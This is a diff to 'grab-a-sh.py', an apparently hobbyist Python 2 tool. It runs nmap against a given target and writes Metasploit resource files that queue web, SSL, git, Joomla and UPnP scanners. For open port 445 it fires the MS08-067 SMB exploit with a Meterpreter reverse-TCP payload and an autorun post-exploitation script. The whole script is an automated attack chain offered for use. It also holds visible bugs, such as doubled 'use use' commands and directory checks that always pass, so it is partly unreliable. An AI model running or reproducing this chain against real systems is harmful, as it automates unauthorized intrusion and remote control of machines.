@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# grab-a-sh.py
+# grab-a-sh.py  
 # version just1.
 # idea : 05082016
 # by code610
@@ -9,9 +9,9 @@
 import sys
 import subprocess
 import os
-import datetime         # for 'now'
+import datetime 	# for 'now'
 
-# defines
+# defines 
 target = sys.argv[1]
 pwd = os.getcwd()
 allLogs = pwd + '/logs/'
@@ -37,6 +37,12 @@ def check_22(target):
 
 def check_http(target, rport):
   print '    + loading : http modules ...'
+  print '      + http_header'
+  saveNetRc('use auxiliary/scanner/http/http_header\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
+
   print '      + dir_scanner'
   saveNetRc('use auxiliary/scanner/http/dir_scanner\n')
   saveNetRc('set RHOSTS ' + target + '\n')
@@ -50,15 +56,29 @@ def check_http(target, rport):
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
+
   print '      + options'
   saveNetRc('use auxiliary/scanner/http/options\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT ' + rport + '\n')
   saveNetRc('run\n')
 
+  print '      + robots_txt'
+  saveNetRc('use auxiliary/scanner/http/robots_txt\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
+
+  print '      + scrapper (get Title)'
+  saveNetRc('use use auxiliary/scanner/http/scraper\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
+
+
 def check_apache(target, rport):
   print '    + loading : apache modules ...'
-  print '      + apache_userdir_enum'
+  print '      + apache_userdir_enum' 
   saveNetRc('use auxiliary/scanner/http/apache_userdir_enum\n')
   saveNetRc('set VERBOSE false\n')
   saveNetRc('set RHOSTS ' + target + '\n')
@@ -67,11 +87,15 @@ def check_apache(target, rport):
 
 def check_iis(target, rport):
   print '    + loading : iis modules ...'
-  print '     + TODO: modules...'
+  print '     + webdav_scanner'
+  saveNetRc('use auxiliary/scanner/http/webdav_scanner\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
 
 
 def check_joomla(target,rport):
-  print '    + loading : joomla modules...'
+  print '    + loading : joomla modules ...'
   saveWWWRc('use auxiliary/scanner/http/joomla_version\n')
   saveWWWRc('set RHOSTS ' + target + '\n')
   saveWWWRc('set RPORT ' + rport + '\n')
@@ -83,30 +107,59 @@ def check_joomla(target,rport):
   saveWWWRc('run\n')
 
 
+def check_git(target, rport):
+  print '    + loading : git modules ...'
+  saveNetRc('use auxiliary/scanner/http/git_scanner\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
 
-def check_http_dirs(target):
+
+def check_http_dirs(target): 
   fp = open(rcspool,'r') # read from msf.net output file
   lines = fp.readlines()
-
+  
   print '[+] Preparing HTTP attacks basing on found directories'
   for line in lines:
     if line.find('Found http://') != -1:
       if line.find('/administrator/') != -1:
         print '  [+] probably Joomla; preparing tests...'
         check_joomla(target,rport)
-
+      elif line.find('.git') != -1:
+        print '  [+] probably git found; preparing tests...'
+        check_git(target, rport)
 
 
 def check_443(target, rport):
-  print '    + loading : 443 modules...'
+  print '    + loading : 443 modules ...'
+  print '      + http_hsts'
+  saveNetRc('use use auxiliary/scanner/http/http_hsts\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
+
+
+  print '      + cert'
   saveNetRc('use auxiliary/scanner/http/cert\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('set RPORT '  + rport + '\n')
   saveNetRc('run\n')
 
+  print '      + ssl'
+  saveNetRc('use auxiliary/scanner/http/ssl\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
+
+  print '      + ssl_version'
+  saveNetRc('use auxiliary/scanner/http/ssl_version\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set RPORT ' + rport + '\n')
+  saveNetRc('run\n')
+
 
 def check_445(target):
-  print '    + loading : 445 modules...'
+  print '    + loading : 445 modules ...'
   saveNetRc('use exploit/windows/smb/ms08_067_netapi\n')
   saveNetRc('set RHOST ' + target + '\n')
   saveNetRc('set PAYLOAD windows/meterpreter/reverse_tcp\n')
@@ -115,6 +168,31 @@ def check_445(target):
   makePost(path2post)
   saveNetRc('set AutoRunScript multi_console_command -rc ' + path2post + '\n')
   saveNetRc('run\n')
+
+
+def check_2869(target):
+  print '    + loading : 2869 modules ...'
+  print '      + ssdp_msearch'
+  saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+  print '      + ssdp_amp'
+  saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+
+def check_5357(target):
+  print '    + loading : 5357 modules ...'
+  saveNetRc('use auxiliary/scanner/upnp/ssdp_msearch\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+  saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
 
 
 
@@ -167,7 +245,7 @@ def readScan(nmaplogfile):
     if port.find('open') != -1:
 
       tmp_port = port.split('/')
-      global rport
+      global rport 
       rport = tmp_port[0]
 
       if port.find('22/tcp') != -1:
@@ -187,12 +265,19 @@ def readScan(nmaplogfile):
       elif port.find('443/tcp') != -1:
         print '[i] HTTPS found on port: ', rport
         check_443(target, rport)
-
+      
 
       elif port.find('445/tcp') != -1:
         print '[i] MS-DC Active Directory found on port: ', rport
         check_445(target)
 
+      elif port.find('2869/tcp') != -1:
+        print '[i] SSDP/UPnP found on port: ', rport
+        check_2869(target)
+
+      elif port.find('5357/tcp') != -1:
+        print '[i] SSDP/UPnP found on port: ', rport
+        check_5357(target)
 
   saveNetRc('exit\n')
   saveWWWRc('exit\n')
@@ -200,7 +285,7 @@ def readScan(nmaplogfile):
 
 def scan(target):
   print '[+] Scanning :', target
-
+  
   exe = 'nmap -sV -T4 -A -P0 -vv -n ' + target + ' -oN ' + nmaplogfile
   print '[+] Started!'
   subprocess.call([ exe ], shell=True)
@@ -223,7 +308,7 @@ def prepareEnv():
     moveRc(rcwww)
 
   # create log dirs
-  print '[i] Checking for log directory : ' + allLogs
+  print '[i] Checking for log directory : ' + allLogs 
 
   if os.path.isdir(allLogs) != -1:
     try:
@@ -234,7 +319,7 @@ def prepareEnv():
 
   print '[i] Checking target directory: ' + tLogDir
   if os.path.isdir(tLogDir) != -1:
-    try:
+    try: 
       os.mkdir(tLogDir)
       print '[+] Directory for target should be here: ' + tLogDir
     except OSError, e:
@@ -257,7 +342,7 @@ def prepareEnv():
       print '[+] HTTP RC file created at : ' + rcwww
     except OSError, e:
       print e
-
+  
 
 
 def sayHi():
@@ -277,7 +362,7 @@ scan(target)
 
 readScan(nmaplogfile)
 runMsfScan(rcfile)
-readSpool(rcspool)
+readSpool(rcspool) 
 
 runMsfScan(rcwww)
 #readSpool(rcwww)
